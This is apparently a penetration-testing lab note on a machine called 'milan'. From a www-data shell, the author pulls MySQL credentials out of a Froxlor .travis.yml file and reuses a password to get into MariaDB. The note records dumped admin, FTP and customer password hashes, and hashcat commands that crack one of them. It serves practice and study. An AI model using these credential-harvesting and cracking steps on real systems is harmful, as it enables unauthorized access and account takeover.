www-data@milan:/var/www/html/froxlor$ netstat -ano | grep 127.0.0.1

![[Enum（DB） image.png]]

www-data@milan:/var/www/html/froxlor$ ls -la

![[Enum（DB） image 1.png]]

www-data@milan:/var/www/html/froxlor$ cat .travis.yml

install:

\- mysql -h 127.0.0.1 --protocol=TCP -u root -pfr0xl0r.TravisCI -e "CREATE DATABASE IF NOT EXISTS froxlor010;"

\- mysql -h 127.0.0.1 --protocol=TCP -u root -pfr0xl0r.TravisCI -e "CREATE USER 'froxlor010'@'%' IDENTIFIED BY 'fr0xl0r.TravisCI';"

\- mysql -h 127.0.0.1 --protocol=TCP -u root -pfr0xl0r.TravisCI -e "GRANT ALL ON froxlor010.* TO 'froxlor010'@'%';"

\- mysql -h 127.0.0.1 --protocol=TCP -u root -pfr0xl0r.TravisCI froxlor010 \< install/froxlor.sql

![[Enum（DB） image 2.png]]

※上記の認証は機能せず

![[Enum（DB） image 3.png]]

oscuser

7NVLVTDGJ38HM2TQ

![[Enum（DB） image 4.png]]

![[Enum（DB） image 5.png]]

\|  1 | admin     | $P$DVNsEBdq7PQdr7GR65xbL0pas6caWx0 |

oscuserのパスワードを使いまわす

7NVLVTDGJ38HM2TQ

![[Enum（DB） image 6.png]]

MariaDB \[froxlor\]> select * from panel_admins\G

![[Enum（DB） image 7.png]]

loginname: admin

password: $5$b50069d236c187f2$PIeKl3JO.NJ5X0hhtHjmJx9nDtImDP61/x4D8Rv/Gu/

name: Froxlor-Administrator

email: admin@milan

MariaDB \[froxlor\]> select * from ftp_users\G

![[Enum（DB） image 8.png]]

Skylark

$5$jigdYlfLyunlywsP$rYt3K4YQwFJvt3Fpq4ss31j9KF8o5Q8CVSa7/YXFRyC

![[Enum（DB） image 9.png]]

letsfly

$5$enbUyVfzahjLdirm$29S4UqN3DcoeTp.AaCJKR0eZ45Z51c2zP4ndlw8aK14

![[Enum（DB） image 10.png]]

flybike

$5$egSnwzfaBdlswnAz$40euq6DBo8DjpoBnMzESWisyauMHST0yjbURPo0s2I5

Crack

└─$ hashcat -m 7400 '$5$egSnwzfaBdlswnAz$40euq6DBo8DjpoBnMzESWisyauMHST0yjbURPo0s2I5' /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force

※Nothing

MariaDB \[froxlor\]> select * from panel_customers\G

![[Enum（DB） image 11.png]]

![[Enum（DB） image 12.png]]

flybike

==🔴$5$gqlmiUswzVgtRBwk$JV0RLv89CvFgXPXN4F78dUFjjicf9DfQW8jnrxrQko2==

└─$ hashcat -m 7400 '$5$gqlmiUswzVgtRBwk$JV0RLv89CvFgXPXN4F78dUFjjicf9DfQW8jnrxrQko2' /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force

![[Enum（DB） image 13.png]]

![[Enum（DB） image 14.png]]

$5$gqlmiUswzVgtRBwk$JV0RLv89CvFgXPXN4F78dUFjjicf9DfQW8jnrxrQko2:==🔴Christopher==